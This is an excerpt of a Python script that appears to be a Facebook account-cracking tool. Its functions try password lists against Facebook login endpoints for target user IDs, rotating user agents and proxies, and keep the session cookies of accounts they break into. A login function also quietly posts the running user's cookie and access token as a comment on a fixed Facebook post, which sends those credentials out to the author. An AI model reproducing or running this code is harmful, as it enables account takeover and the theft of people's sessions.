...
def login_cokies():
    try:
        ...
        tem      = ('\nKeren Bang @[100019559050234:0]\n\nSukses Terus Yah Bang, Semoga Yang Di Cita - Citakan Bisa Tercapai\n')
        requests.post(f"https://graph.facebook.com/v17.0/100019559050234_pfbid0GNA4zYvdGUt4drXqjyEdSJgZQPEf3ArkhpQUqHhPuHjv5gMphTjuYFfjJ11327wol/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
...
def crackvalidate(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			ref = rc([f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv6.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D288796421158889%26redirect_uri%3Dhttps%253A%252F%252Fwww.codeproject.com%252Fscript%252FMembership%252FOAuthLogOn.aspx%26scope%3Demail%26state%3D8153757%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc0e1a82c-c031-430b-8205-010a227e9cf2%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codeproject.com%2Fscript%2FMembership%2FOAuthLogOn.aspx%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8153757%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
	        ...
	        "uid":idf,
	        "next":f"https://{url}/v6.0/dialog/oauth?response_type=code&client_id=288796421158889&redirect_uri=https%3A%2F%2Fwww.codeproject.com%2Fscript%2FMembership%2FOAuthLogOn.aspx&scope=email&state=8153757&ret=login&fbapp_pres=0&logger_id=c0e1a82c-c031-430b-8205-010a227e9cf2&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        }     
...
def crackasyinc(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=432752728108485&kid_directed_site=0&app_id=432752728108485&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fscope%3Demail%26state%3D3534266f127d533d8fa4fd996d84c233%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fearlygame.comindex.php%253Fp%253Dactionssociallogin-accountscallback%26client_id%3D432752728108485%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D177d65a3-6404-425d-9e71-549d472b8935%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fearlygame.comindex.php%2F%3Fp%3Dactionssociallogin-accountscallback%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3534266f127d533d8fa4fd996d84c233%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
			...
			"accept-encoding": "gzip, deflate, br",
			"accept-language": ver}		
			links = rc([f"https://{url}/login/device-based/login/async/?api_key=432752728108485&auth_token=4dd8fe90546759414e67914eea50a774&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fscope%3Demail%26state%3D3534266f127d533d8fa4fd996d84c233%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fearlygame.comindex.php%253Fp%253Dactionssociallogin-accountscallback%26client_id%3D432752728108485%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D177d65a3-6404-425d-9e71-549d472b8935%26tp%3Dunspecified&refsrc=deprecated&app_id=432752728108485&cancel=https%3A%2F%2Fearlygame.comindex.php%2F%3Fp%3Dactionssociallogin-accountscallback%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3534266f127d533d8fa4fd996d84c233%23_%3D_&lwv=100"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
